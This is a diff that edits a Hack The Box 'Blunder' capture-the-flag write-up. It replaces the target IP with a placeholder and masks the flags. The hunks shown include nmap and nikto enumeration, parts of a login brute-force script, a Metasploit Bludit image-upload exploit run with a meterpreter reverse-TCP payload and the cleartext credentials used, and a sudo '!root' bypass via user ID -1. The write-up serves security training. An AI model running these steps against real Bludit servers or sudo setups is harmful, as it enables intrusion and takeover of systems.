@@ -11,8 +11,6 @@ htb_url: https://app.hackthebox.com/machines/Blunder
 ---
 ## Overview
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/screenshot-2020-10-27-201546.png)
-
 This easy difficulty Linux machine featured a content management system that was new to me, and a simple to use but interesting way to bypass a common configuration used by system administrators to grant permissions without allowing root access.  It required writing a Python script to brute force a login, and had multiple ways to exploit the vulnerable service to gain access.  The root privilege escalation method was very realistic, but so simple and easy to do it was almost disappointing to complete this machine so quickly.
 
 ## Useful Skills and Tools
@@ -35,12 +33,12 @@ This easy difficulty Linux machine featured a content management system that was
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `10.10.10.191`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` saves the output with a filename of `<name>`.
+I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` saves the output with a filename of `<name>`.
 
 ```text
-zweilos@kali:~/htb/blunder$ nmap -p- -sC -sV -oN blunder 10.10.10.191
+zweilos@kali:~/htb/blunder$ nmap -p- -sC -sV -oN blunder <YOUR_IP>
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-06 19:11 EDT
-Nmap scan report for 10.10.10.191
+Nmap scan report for <YOUR_IP>
 Host is up (0.044s latency).
 Not shown: 65533 filtered ports
 PORT   STATE  SERVICE VERSION
@@ -63,8 +61,8 @@ Since there was nothing else I could do, I navigated my web browser to the HTTP 
 ```text
 - Nikto v2.1.6
 ---------------------------------------------------------------------------
-+ Target IP:          10.10.10.191
-+ Target Hostname:    10.10.10.191
++ Target IP:          <YOUR_IP>
++ Target Hostname:    <YOUR_IP>
 + Target Port:        80
 + Start Time:         2020-08-06 19:12:43 (GMT-4)
 ---------------------------------------------------------------------------
@@ -169,13 +167,13 @@ I also found the file `todo.txt` which contained a potential username `fergus` a
     <link rel="shortcut icon" type="image/x-icon" href="/bl-kernel/img/favicon.png?version=3.9.2">
 
     <!-- CSS -->
-    <link rel="stylesheet" type="text/css" href="http://10.10.10.191/bl-kernel/css/bootstrap.min.css?version=3.9.2">
-<link rel="stylesheet" type="text/css" href="http://10.10.10.191/bl-kernel/admin/themes/booty/css/bludit.css?version=3.9.2">
-<link rel="stylesheet" type="text/css" href="http://10.10.10.191/bl-kernel/admin/themes/booty/css/bludit.bootstrap.css?version=3.9.2">
+    <link rel="stylesheet" type="text/css" href="http://<YOUR_IP>/bl-kernel/css/bootstrap.min.css?version=3.9.2">
+<link rel="stylesheet" type="text/css" href="http://<YOUR_IP>/bl-kernel/admin/themes/booty/css/bludit.css?version=3.9.2">
+<link rel="stylesheet" type="text/css" href="http://<YOUR_IP>/bl-kernel/admin/themes/booty/css/bludit.bootstrap.css?version=3.9.2">
 
     <!-- Javascript -->
-    <script src="http://10.10.10.191/bl-kernel/js/jquery.min.js?version=3.9.2"></script>
-<script src="http://10.10.10.191/bl-kernel/js/bootstrap.bundle.min.js?version=3.9.2"></script>
+    <script src="http://<YOUR_IP>/bl-kernel/js/jquery.min.js?version=3.9.2"></script>
+<script src="http://<YOUR_IP>/bl-kernel/js/bootstrap.bundle.min.js?version=3.9.2"></script>
 
     <!-- Plugins -->
     </head>
@@ -264,13 +262,11 @@ def file_to_list(wList):
 
     return passlist
 
-
 def cleanup(processes):
         # Wait for all worker processes to finish
     for p in processes:
         p.terminate()
         p.join()
-
 
 if __name__ == '__main__':
     if len(sys.argv) != 4:
@@ -322,7 +318,6 @@ Now that I had a working username and password to the `/admin/` page I was able 
 ```text
 zweilos@kali:~/htb/blunder$ msfconsole
 
-
       .:okOOOkdc'           'cdkOOOko:.
     .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
    :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
@@ -368,7 +363,6 @@ Module options (exploit/linux/http/bludit_upload_images_exec):
    TARGETURI   /                yes       The base path for Bludit
    VHOST                        no        HTTP server virtual host
 
-
 Payload options (php/meterpreter/reverse_tcp):
 
    Name   Current Setting  Required  Description
@@ -376,20 +370,18 @@ Payload options (php/meterpreter/reverse_tcp):
    LHOST  192.168.239.129  yes       The listen address (an interface may be specified)
    LPORT  4444             yes       The listen port
 
-
 Exploit target:
 
    Id  Name
    --  ----
    0   Bludit v3.9.2
 
-
 msf5 exploit(linux/http/bludit_upload_images_exec) > set BLUDITPASS RolandDeschain
 BLUDITPASS => RolandDeschain
 msf5 exploit(linux/http/bludit_upload_images_exec) > set BLUDITUSER fergus
 BLUDITUSER => fergus
-msf5 exploit(linux/http/bludit_upload_images_exec) > set RHOSTS 10.10.10.191
-RHOSTS => 10.10.10.191
+msf5 exploit(linux/http/bludit_upload_images_exec) > set RHOSTS <YOUR_IP>
+RHOSTS => <YOUR_IP>
 msf5 exploit(linux/http/bludit_upload_images_exec) > set LHOST tun0
 LHOST => tun0
 msf5 exploit(linux/http/bludit_upload_images_exec) > set LPORT 44446
@@ -403,12 +395,11 @@ Module options (exploit/linux/http/bludit_upload_images_exec):
    BLUDITPASS  RolandDeschain   yes       The password for Bludit
    BLUDITUSER  fergus           yes       The username for Bludit
    Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
-   RHOSTS      10.10.10.191     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RHOSTS      <YOUR_IP>     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
    RPORT       80               yes       The target port (TCP)
    SSL         false            no        Negotiate SSL/TLS for outgoing connections
    TARGETURI   /                yes       The base path for Bludit
    VHOST                        no        HTTP server virtual host
-
 
 Payload options (php/meterpreter/reverse_tcp):
 
@@ -416,7 +407,6 @@ Payload options (php/meterpreter/reverse_tcp):
    ----   ---------------  --------  -----------
    LHOST  tun0             yes       The listen address (an interface may be specified)
    LPORT  44446             yes       The listen port
-
 
 Exploit target:
 
@@ -432,8 +422,8 @@ msf5 exploit(linux/http/bludit_upload_images_exec) > run
 [*] Uploading zzYXCHGvEG.png...
 [*] Uploading .htaccess...
 [*] Executing zzYXCHGvEG.png...
-[*] Sending stage (38288 bytes) to 10.10.10.191
-[*] Meterpreter session 1 opened (10.10.15.57:44446 -> 10.10.10.191:57506) at 2020-08-08 22:30:06 -0400
+[*] Sending stage (38288 bytes) to <YOUR_IP>
+[*] Meterpreter session 1 opened (10.10.15.57:44446 -> <YOUR_IP>:57506) at 2020-08-08 22:30:06 -0400
 [+] Deleted .htaccess
 
 meterpreter >
@@ -722,7 +712,7 @@ hugo@blunder:/var/www/bludit-3.9.2/bl-content/databases$ cd ~
 cd ~
 hugo@blunder:~$ cat user.txt
 cat user.txt
-dcf1f1f3ecde4b372edf165518df8a77
+****
 ```
 
 Once I got a system shell, I used my standard shell upgrade steps, but it didn't quite work the way I wanted, so I was stuck with a half-functional shell.  Despite this I was able to switch users to `hugo` and collect my `user.txt` proof.  
@@ -840,9 +830,7 @@ sudo -l
 User hacker may run the following commands on kali:
     (ALL, !root) /bin/bash
 
-
 So user hacker can't run /bin/bash as root (!root)
-
 
 User hacker sudo privilege in /etc/sudoers
 
@@ -850,7 +838,6 @@ User hacker sudo privilege in /etc/sudoers
 root    ALL=(ALL:ALL) ALL
 
 hacker ALL=(ALL,!root) /bin/bash
-
 
 With ALL specified, user hacker can run the binary /bin/bash as any user
 
@@ -916,7 +903,7 @@ uid=1000(shaun) gid=1000(shaun) groups=1000(shaun),4(adm),24(cdrom),30(dip),46(p
 root@blunder:/dev/shm# id
 uid=0(root) gid=1001(hugo) groups=1001(hugo)
 root@blunder:/dev/shm# cat /root/root.txt 
-e65080f4dddab786a01c78e4df40f5f7
+****
 root@blunder:/dev/shm#
 ```
 
@@ -927,7 +914,3 @@ Next I used the invalid user ID number `'-1'` with the same command and compared
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/screenshot-2020-10-27-201305.png)
 
 ### Root.txt
-
-Thanks to [`egotisticalSW`](https://app.hackthebox.eu/users/94858) for creating this machine with an easy, yet fun new privilege escalation method!  I always love learning new ways to exploit systems that are so simple, yet so elegant.
-
-If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
